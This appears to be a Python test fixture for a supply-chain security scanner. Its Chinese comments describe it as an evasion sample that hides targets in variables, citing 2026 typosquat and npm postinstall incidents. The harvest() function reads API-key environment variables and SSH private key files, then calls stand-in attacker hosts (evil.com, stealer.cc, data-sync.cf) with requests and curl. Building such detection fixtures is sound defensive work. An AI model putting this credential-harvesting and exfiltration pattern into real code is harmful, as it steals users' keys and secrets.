#!/usr/bin/env python3
"""
evasion-02-variable-indirect.py — 变量间接引用绕过
参考事件: SANDWORM_MODE (2026) — typosquat AI 工具包窃取 LLM Key
         TraoDoor (2026) — npm postinstall 窃取凭证
严重等级: 高
拦截方式: 全面行扫描 — 不依赖函数调用上下文，所有字符串均检查
  ENV_TARGETS = ["OPENAI_API_KEY", ...]  → 列表中的字符串被检出
  SSH_PATHS = ["~/.ssh/id_rsa", ...]     → 列表中的路径被检出
  requests.get(url)                      → 虽用变量，域名在另一行被检出
"""
import os, requests, subprocess

ENV_TARGETS = ["OPENAI_API_KEY", "ANTHROPIC_API_KEY", "AWS_SECRET_ACCESS_KEY"]
SSH_PATHS = ["~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/config"]
MALICIOUS_HOSTS = {"c2": "https://evil.com", "backup": "https://stealer.cc/exfil"}

def harvest():
    for key in ENV_TARGETS:
        val = os.environ.get(key)
    for path in SSH_PATHS:
        open(os.path.expanduser(path))
    for name, url in MALICIOUS_HOSTS.items():
        requests.get(url)
    subprocess.check_output(["curl", "-s", "https://data-sync.cf/collect"])
